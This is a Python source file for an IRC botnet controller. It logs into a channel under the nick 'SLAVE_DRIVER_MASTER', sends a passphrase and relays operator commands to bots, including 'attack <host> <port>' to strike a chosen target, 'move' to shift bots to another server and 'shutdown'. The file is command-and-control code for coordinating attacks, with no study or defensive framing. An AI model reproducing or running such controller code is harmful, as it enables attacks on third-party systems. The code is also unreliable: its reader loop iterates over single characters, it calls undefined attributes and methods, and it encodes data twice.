import time
import socket 
import sys 
import threading

class conBot:
    
    def setup(self, host, port, channel, phrase):
        self.HOST = host
        self.PORT = int(port)
        self.CHANNEL = channel
        self.PHRASE = phrase
        self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # CONTROLLER INFO
        self.conNick = "SLAVE_DRIVER_MASTER"
        self.liveConnection = False # Flag to see if controller connection to IRC Server is active
        self.command = None

        # BOT INFO
        self.botList = []
        self.botsSuccessful = []
        self.botsFailed = []
        self.botsMoved = []
        self.botsDisconnected = []

        try:
            self.IRCSOCKET.connect((self.HOST, self.PORT))
        except Exception as e:
            sys.stderr.write("Error: " + str(e))
            sys.exit(0)

        

    def IRCconnect(self):
        self.sendData("NICK {}\n" .format(self.conNick))
        self.sendData("USER bot * * :{}\n" .format(self.conNick))
        self.sendData("JOIN #{}\n" .format(self.CHANNEL))
        resp = self.getData()
        print(resp)
        return "433" in resp

    # PingPong protocol
    def pong(self):
        pass

    # Get response from Bot 
    def getData(self):
        return self.IRCSOCKET.recv(2048).decode().strip()

    def sendData(self, msg):
        print("sent msg " + msg)
        self.IRCSOCKET.send(msg.encode())

    def sendCommand(self, receiver, msg):
        self.sendData("PRIVMSG {} :{}\n" .format(receiver, msg))
        print("sent " + msg + " to " + receiver)
    

    def handleResponse(self, prefix, text):
        print("from " + prefix + ": " + text)

    def reader(self):
        try:
            while True:
                responses = self.getData()
                for response in responses:
                    if(response != ""):                                         
                        if response.find("PRIVMSG") != -1:                           
                            name = response.split('!',1)[0][1:]
                            message = response.split('PRIVMSG',1)[1].split(':',1)[1]
                            print("message from " + name + ": " + message)                                  
                        elif response.find("PING") != -1:
                            self.sendData("PONG {}: :\r\n".format(self.HOST).encode("utf-8"))                                                                          
                        elif response.find('433') != -1:
                            self.createNick(self.NICK)
                            self.connectIRC(self.s,self.NICK, self.chan)        
        except Exception as e:
            print("Exception: ")
            print(e)
            print("Reconnecting in 5 seconds ...")
            time.sleep(5)
            self.reader()


    # takes command input from user and sends it to bots
    def commandHandler(self):
        while True:

            userCommand = input("command> ")
            self.command = userCommand.split()

            self.sendCommand("#" + self.CHANNEL, self.PHRASE)

            if (self.command[0] == "status"):
                self.sendCommand("#" + self.CHANNEL, self.command[0])
            elif (self.command[0] == "attack"):
                if (len(self.command) == 3):
                    self.botsSuccessful = []
                    self.botsFailed = []
                    self.sendCommand("#" + self.CHANNEL, userCommand)
                else:
                    print("Incorrect usage of command: attack <host-name> <port>")
            elif (self.command[0] == "move"):
                if(len(self.command) == 4):
                    self.botsMoved = []
                    self.sendCommand("#" + self.CHANNEL, userCommand)
                else:
                    print("Incorrect usage of command: move <host-name> <port> <channel>")
            elif (self.command[0] == "quit"):
                sys.exit(0)
            elif (self.command[0] == "shutdown"):
                self.botsDisconnected = []
                self.sendCommand("#" + self.CHANNEL, self.command[0])
            
def main():
    
    invalidNick = True
    noConnection = True
        # Get sys.argv
    if len(sys.argv) != 5:
        print("Wrong number of arguments")
        sys.exit() 
    
    HOST = sys.argv[1]
    PORT = sys.argv[2]
    CHANNEL = sys.argv[3]
    PHRASE = sys.argv[4]

    # Check if port is in valid range 
    if not PORT.isdigit():
        print("Invalid port.")
        sys.exit() 
    
    cbot = conBot()

    # Keep connection to IRC server 
    while True:
        
        # set up controller bot and try to connect to the IRC
        try:
            cbot.setup(HOST, PORT, CHANNEL, PHRASE)
        except Exception as e:
            print("{} Trying to reconnect..." .format(e))
            continue

        while noConnection:
            noConnection = cbot.IRCconnect()
        
        print("Controller is running. Connected with nick: " + cbot.conNick)

        # create a thread that will continuously read from the IRC
        readThread = threading.Thread(target = cbot.reader)
        readThread.daemon = True
        readThread.start()
        
        cbot.commandHandler()



if __name__ == "__main__":
    main()

